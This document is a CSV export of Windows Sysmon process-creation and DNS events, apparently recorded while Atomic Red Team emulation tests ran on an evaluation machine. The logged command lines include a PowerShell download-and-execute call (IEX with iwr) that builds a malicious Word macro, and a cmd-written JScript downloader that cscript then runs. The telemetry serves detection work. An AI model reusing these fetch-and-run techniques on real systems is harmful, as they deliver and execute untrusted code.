Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a3ed-658c-c901-000000000f00},3588,2980,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:23:41.2752915Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:41.269,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:41.2752915Z""/>
      <EventRecordID>19580</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:41.269</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ed-658c-c901-000000000f00}</Data>
      <Data Name=""ProcessId"">2980</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""  a = Shell(`\""""cmd.exe /c choice /C Y /N /D Y /T 3`\"""", vbNormalFocus)\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:41.269

ProcessGuid: {f57bd86a-a3ed-658c-c901-000000000f00}

ProcessId: 2980

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""  a = Shell(`\""""cmd.exe /c choice /C Y /N /D Y /T 3`\"""", vbNormalFocus)\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,cscript  //E:Jscript C:\Users\User\AppData\Local\Temp\OSTapGet.js,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft ® Console Based Script Host,,,,,,1,19579,5.812.10240.16384,"MD5=817B20F1E8787A88464DBAA925893A35,SHA256=65B7BB45C66BB918B9E2F267A8A3D7EF5B46F7CAC6DF6F4DBEA803334F411B1A,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3",C:\Windows\System32\cscript.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:40.440

ProcessGuid: {f57bd86a-a3ec-658c-c801-000000000f00}

ProcessId: 4520

Image: C:\Windows\System32\cscript.exe

FileVersion: 5.812.10240.16384

Description: Microsoft ® Console Based Script Host

Product: Microsoft ® Windows Script Host

Company: Microsoft Corporation

OriginalFileName: cscript.exe

CommandLine: cscript  //E:Jscript C:\Users\User\AppData\Local\Temp\OSTapGet.js

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=817B20F1E8787A88464DBAA925893A35,SHA256=65B7BB45C66BB918B9E2F267A8A3D7EF5B46F7CAC6DF6F4DBEA803334F411B1A,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3

ParentProcessGuid: {f57bd86a-a3ec-658c-c601-000000000f00}

ParentProcessId: 9504

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo var url = ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js & cscript //E:Jscript %TEMP%\OSTapGet.js

ParentUser: WINDEV2309EVAL\User",Info,cscript.exe,"""cmd.exe"" /c echo var url = ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js & cscript //E:Jscript %TEMP%\OSTapGet.js",C:\Windows\System32\cmd.exe,{f57bd86a-a3ec-658c-c601-000000000f00},9504,WINDEV2309EVAL\User,{f57bd86a-a3ec-658c-c801-000000000f00},3588,4520,Microsoft ® Windows Script Host,,,,,"
      ",-,,,,,,2023-12-27T22:23:40.4466391Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:40.440,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:40.4466391Z""/>
      <EventRecordID>19579</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:40.440</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ec-658c-c801-000000000f00}</Data>
      <Data Name=""ProcessId"">4520</Data>
      <Data Name=""Image"">C:\Windows\System32\cscript.exe</Data>
      <Data Name=""FileVersion"">5.812.10240.16384</Data>
      <Data Name=""Description"">Microsoft &#174; Console Based Script Host</Data>
      <Data Name=""Product"">Microsoft &#174; Windows Script Host</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">cscript.exe</Data>
      <Data Name=""CommandLine"">cscript  //E:Jscript C:\Users\User\AppData\Local\Temp\OSTapGet.js</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=817B20F1E8787A88464DBAA925893A35,SHA256=65B7BB45C66BB918B9E2F267A8A3D7EF5B46F7CAC6DF6F4DBEA803334F411B1A,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a3ec-658c-c601-000000000f00}</Data>
      <Data Name=""ParentProcessId"">9504</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c echo var url = ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); &gt; %TEMP%\OSTapGet.js &amp; cscript //E:Jscript %TEMP%\OSTapGet.js</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:40.440

ProcessGuid: {f57bd86a-a3ec-658c-c801-000000000f00}

ProcessId: 4520

Image: C:\Windows\System32\cscript.exe

FileVersion: 5.812.10240.16384

Description: Microsoft &#174; Console Based Script Host

Product: Microsoft &#174; Windows Script Host

Company: Microsoft Corporation

OriginalFileName: cscript.exe

CommandLine: cscript  //E:Jscript C:\Users\User\AppData\Local\Temp\OSTapGet.js

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=817B20F1E8787A88464DBAA925893A35,SHA256=65B7BB45C66BB918B9E2F267A8A3D7EF5B46F7CAC6DF6F4DBEA803334F411B1A,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3

ParentProcessGuid: {f57bd86a-a3ec-658c-c601-000000000f00}

ParentProcessId: 9504

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo var url = ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); &gt; %TEMP%\OSTapGet.js &amp; cscript //E:Jscript %TEMP%\OSTapGet.js

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c echo var url = ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %%TEMP%%\OSTapGet.js & cscript //E:Jscript %%TEMP%%\OSTapGet.js",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,1,19578,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:40.401

ProcessGuid: {f57bd86a-a3ec-658c-c601-000000000f00}

ProcessId: 9504

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c echo var url = ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %%TEMP%%\OSTapGet.js & cscript //E:Jscript %%TEMP%%\OSTapGet.js

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a3ec-658c-c601-000000000f00},3588,9504,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:23:40.4025969Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:40.401,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:40.4025969Z""/>
      <EventRecordID>19578</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:40.401</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ec-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">9504</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c echo var url = ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); &gt; %%TEMP%%\OSTapGet.js &amp; cscript //E:Jscript %%TEMP%%\OSTapGet.js</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:40.401

ProcessGuid: {f57bd86a-a3ec-658c-c601-000000000f00}

ProcessId: 9504

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c echo var url = ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); &gt; %%TEMP%%\OSTapGet.js &amp; cscript //E:Jscript %%TEMP%%\OSTapGet.js

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19577,,,<unknown process>,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:17.632

ProcessGuid: {f57bd86a-a3e7-658c-c401-000000000f00}

ProcessId: 10140

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3e7-658c-c401-000000000f00},3588,10140,,,raw.githubusercontent.com,::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;,0,"
      ",-,,,,,,2023-12-27T22:23:39.0759063Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:17.632,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:39.0759063Z""/>
      <EventRecordID>19577</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:17.632</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3e7-658c-c401-000000000f00}</Data>
      <Data Name=""ProcessId"">10140</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:17.632

ProcessGuid: {f57bd86a-a3e7-658c-c401-000000000f00}

ProcessId: 10140

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
